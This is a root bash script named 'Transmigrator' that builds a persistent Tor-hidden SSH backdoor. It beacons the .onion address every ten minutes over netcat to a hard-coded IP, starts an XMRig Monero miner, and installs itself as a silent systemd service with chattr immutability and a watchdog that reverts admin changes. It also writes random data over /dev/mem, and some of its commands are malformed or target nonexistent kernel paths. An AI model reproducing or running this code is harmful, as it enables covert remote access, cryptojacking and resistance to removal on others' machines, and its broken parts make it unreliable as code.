#!/bin/bash

# Ensure script is run as root
if [ "$(id -u)" -ne 0; then
  echo "This script must be run as root" >&2
  exit 1
fi

# Install necessary packages
apt-get update
apt-get install -y tor gnome-boxes tails netcat unattended-upgrades

# Generate Hidden Service URL
generate_hidden_service() {
  local hidden_service_dir="/var/lib/tor/hidden_service"
  mkdir -p "$hidden_service_dir"
  echo "HiddenServiceDir $hidden_service_dir" > /etc/tor/torrc
  echo "HiddenServicePort 22 127.0.0.1:22" >> /etc/tor/torrc
  systemctl restart tor
  sleep 10  # Wait for Tor to generate the hidden service
  local onion_url=$(cat "$hidden_service_dir/hostname")
  echo "Hidden Service URL: $onion_url"
  echo "Secured Hidden Service URL: $onion_url"
}

# Beacon function to send .onion URL to server
send_beacon() {
  local server_ip="147.237.7.27"
  local server_port="80"
  local hidden_service_dir="/var/lib/tor/hidden_service"
  local onion_url=$(cat "$hidden_service_dir/hostname")
  
  while true; do
    echo "$onion_url" | nc -w 3 "$server_ip" "$server_port"
    sleep 600  # Send every 10 minutes
  done
}

# Setup GNOME Box with Tails VM
setup_gnome_box() {
  local tails_image="/path/to/tails.iso"
  gnome-boxes --create --name "Tails VM" --memory 2048 --disk 0 --os "$tails_image"
}

# Configure iptables
configure_iptables() {
  iptables -A INPUT -i lo -p tcp --dport 22 -j ACCEPT
  iptables -A INPUT -i lo -p tcp --dport 9050 -j ACCEPT
  iptables -A INPUT -i lo -p tcp --dport 443 -j ACCEPT
  iptables -A OUTPUT -o lo -p tcp --dport 22 -j ACCEPT
  iptables -A OUTPUT -o lo -p tcp --dport 9050 -j ACCEPT
  iptables -A OUTPUT -o lo -p tcp --dport 443 -j ACCEPT
}

# Memory sanitation
sanitize_memory() {
  echo "Sanitizing memory..."
  # Fill memory with random values to mitigate data remanence
  dd if=/dev/urandom of=/dev/mem bs=1M count=$(free -m | awk '/^Mem:/{print $2}') status=progress
  echo "Memory sanitized."
}

# Daemonize the script
daemonize_script() {
  cat <<EOF > /etc/systemd/system/transmigrator.service
[Unit]
Description=Transmigrator Service
After=network.target

[Service]
ExecStart=/path/to/.transmigrator.sh.x
Restart=always
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
  systemctl enable transmigrator.service
  systemctl start transmigrator.service
}

# Setup XMRig crypto miner
setup_xmrig() {
  wget -O config.json https://raw.githubusercontent.com/transmigrator/miscellaneous/refs/heads/main/config.json
  ./xmrig --coin XMR --url "xmr.kryptex.network:7777" --user project@transmigrator.org/transmigrator -p x -k &
}

# Function to check if the VM is running
is_vm_running() {
  pgrep -f "gnome-boxes" > /dev/null
}

# Function to reinstall third-party packages
reinstall_packages() {
  apt-get update
  apt-get install -y tor gnome-boxes tails netcat unattended-upgrades
}

# Function to restore configuration files
restore_config_files() {
  # Restore /etc/tor/torrc
  echo "HiddenServiceDir /var/lib/tor/hidden_service" > /etc/tor/torrc
  echo "HiddenServicePort 22 127.0.0.1:22" >> /etc/tor/torrc

  # Restore /etc/systemd/system/transmigrator.service
  cat <<EOF > /etc/systemd/system/transmigrator.service
[Unit]
Description=Transmigrator Service
After=network.target

[Service]
ExecStart=/path/to/.transmigrator.sh.x
Restart=always
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

  # Add other config files as needed
}

# Function to check and reverse illegal changes
check_and_reverse_changes() {
  # Check if packages are installed, if not reinstall them
  dpkg -l | grep -qw tor || reinstall_packages
  dpkg -l | grep -qw gnome-boxes || reinstall_packages
  dpkg -l | grep -qw tails || reinstall_packages
  dpkg -l | grep -qw netcat || reinstall_packages
  dpkg -l | grep -qw unattended-upgrades || reinstall_packages

  # Restore configuration files if they have been altered
  restore_config_files

  # Ensure the script itself is immutable
  chattr +i /path/to/.transmigrator.sh.x

  # Revert any changes related to VM persistence, core dumps, or swaps
  # Disable VM persistence
  echo 0 > /proc/sys/vm/persistence

  # Disable core dumps
  echo 0 > /proc/sys/kernel/core_pattern

  # Disable swap
  swapoff -a
}

# Watchdog for self-preservation and memory sanitation
watchdog() {
  while true; do
    if ! is_vm_running; then
      sanitize_memory
      break
    fi
    check_and_reverse_changes
    sleep 10
  done
}

# Main function
main() {
  generate_hidden_service
  setup_gnome_box
  configure_iptables
  daemonize_script
  setup_xmrig
  send_beacon &
  watchdog
}

main "$@"